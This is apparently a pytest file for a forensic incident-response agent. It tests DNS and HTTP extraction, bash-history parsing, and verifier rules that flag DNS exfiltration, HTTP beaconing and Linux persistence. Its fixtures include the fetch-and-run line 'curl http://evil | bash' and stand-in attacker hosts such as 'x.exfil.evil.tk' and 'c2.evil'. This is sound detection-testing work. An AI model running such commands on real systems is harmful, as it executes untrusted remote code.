"""Phase 1 — network and Linux tool tests."""

from __future__ import annotations

from pathlib import Path

import pytest

from postmortem_agent.core import run_investigation
from postmortem_agent.state import AgentConfig
from postmortem_mcp.catalog import CATALOG
from postmortem_mcp.dispatch import TOOL_REGISTRY
from postmortem_mcp.tools.linux import linux_bash_history
from postmortem_mcp.tools.network import net_dns_extract, net_http_extract
from postmortem_verify.models import VerifyContext
from postmortem_verify.rules import rule_r10_linux_persistence, rule_r8_dns_exfil, rule_r9_http_beacon

REPO_ROOT = Path(__file__).resolve().parents[1]


def test_catalog_drift_phase1() -> None:
    assert len(TOOL_REGISTRY) == len(CATALOG) == 54


def test_net_dns_extract_fixture(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("EVIDENCE_ROOT", str(REPO_ROOT / "examples" / "case-network"))
    monkeypatch.setenv("CASE_OUTPUT", str(tmp_path / "cases"))
    result = net_dns_extract("t1", "network/capture.pcap")
    assert result["ok"] is True
    assert result["data"]["query_count"] >= 10


def test_net_http_beacon_fixture(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("EVIDENCE_ROOT", str(REPO_ROOT / "examples" / "case-network"))
    monkeypatch.setenv("CASE_OUTPUT", str(tmp_path / "cases"))
    result = net_http_extract("t2", "network/capture.pcap")
    assert result["ok"] is True
    assert result["data"]["periodic_same_size"]


def test_r8_dns_exfil_rule() -> None:
    ctx = VerifyContext(
        dns_queries=[{"query": "x.exfil.evil.tk"} for _ in range(12)],
        dns_audit_id="abc12345",
    )
    result = rule_r8_dns_exfil(ctx)
    assert result.status == "contradiction"


def test_r9_http_beacon_rule() -> None:
    ctx = VerifyContext(
        http_periodic=[{"host": "c2.evil", "size": 512, "count": 5}],
        http_audit_id="def67890",
    )
    result = rule_r9_http_beacon(ctx)
    assert result.status == "contradiction"


def test_linux_bash_history(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("EVIDENCE_ROOT", str(REPO_ROOT / "examples" / "case-linux"))
    monkeypatch.setenv("CASE_OUTPUT", str(tmp_path / "cases"))
    result = linux_bash_history("t3", "home/user/.bash_history")
    assert result["ok"] is True
    assert result["data"]["hit_count"] >= 1


def test_r10_linux_persistence_rule() -> None:
    ctx = VerifyContext(
        linux_persistence_findings=[{"line": "curl http://evil | bash"}],
        linux_audit_id="aaaabbbb",
    )
    result = rule_r10_linux_persistence(ctx)
    assert result.status == "contradiction"


def test_autonomous_linux_case(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CASE_OUTPUT", str(tmp_path / "cases"))
    monkeypatch.setenv("EVIDENCE_ROOT", str(REPO_ROOT / "examples" / "case-linux"))
    state = run_investigation(
        AgentConfig(case_id="linux-auto", evidence_case=".", max_iterations=15)
    )
    assert state.done
    assert "linux_log" in (state.survey.get("kinds_present") or [])
    assert any(t.startswith("linux_") for t in state.tool_results)
    r10 = next((r for r in state.verifier_results if r.rule_id == "R10"), None)
    assert r10 is not None
    assert r10.status == "contradiction"


def test_autonomous_network_case(tmp_path: Path, monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setenv("CASE_OUTPUT", str(tmp_path / "cases"))
    monkeypatch.setenv("EVIDENCE_ROOT", str(REPO_ROOT / "examples" / "case-network"))
    state = run_investigation(
        AgentConfig(case_id="net-auto", evidence_case=".", max_iterations=12)
    )
    assert state.done
    assert "pcap" in (state.survey.get("kinds_present") or [])
    assert any(t.startswith("net_") for t in state.tool_results)
